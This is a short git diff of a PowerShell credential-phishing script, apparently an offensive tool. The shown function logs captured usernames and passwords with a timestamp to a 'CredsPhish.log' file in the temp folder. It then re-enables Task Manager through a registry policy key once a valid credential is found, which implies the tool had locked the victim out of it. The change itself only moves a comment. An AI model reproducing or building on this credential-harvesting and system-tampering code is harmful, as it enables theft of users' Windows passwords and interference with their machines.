@@ -103,8 +103,7 @@ function Credentials(){
                     echo "   TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
                     echo "   username  : $Username" >> $env:tmp\CredsPhish.log
                     echo "   password  : $Password" >> $env:tmp\CredsPhish.log
-                        If($shellCredsAdmin){
-                            ## This Line Un-Blocks Remote-Host 'task manager' after an valid credential is found. (Admin privileges Required)
+                        If($shellCredsAdmin){## This Line Un-Blocks Remote-Host 'task manager' after an valid credential is found. (Admin privileges Required)
                             Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force
                         }
                     Start-Process -FilePath $env:windir\explorer.exe
